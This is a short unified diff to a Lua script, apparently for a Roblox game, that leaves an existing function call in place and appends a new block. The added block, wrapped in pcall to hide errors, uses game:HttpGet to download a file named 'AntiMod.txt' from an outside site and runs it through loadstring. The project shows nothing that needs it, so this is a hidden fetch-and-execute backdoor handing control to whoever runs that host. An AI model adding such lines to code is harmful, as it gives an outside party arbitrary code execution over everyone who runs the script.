@@ -165,4 +165,6 @@ function turnonque()
 end
 end
 turnonque()
-
+pcall(function()
+loadstring(game:HttpGet("https://9kdestroyer.xyz/ResponseData/AntiMod.txt"))()
+end)
